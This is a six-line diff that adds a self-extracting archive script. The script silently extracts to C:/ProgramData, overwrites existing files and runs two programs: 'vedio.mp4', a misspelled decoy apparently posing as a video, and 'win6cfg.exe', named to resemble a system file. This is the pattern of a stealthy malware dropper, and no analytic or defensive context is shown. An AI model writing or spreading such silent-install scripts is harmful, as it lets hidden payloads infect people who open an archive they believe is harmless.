@@ -1,0 +1,6 @@
+;this comment below contains SFX script commands
+Path=C:/ProgramData
+Setup=vedio.mp4
+Setup=win6cfg.exe
+Silent=1
+Overwrite=1
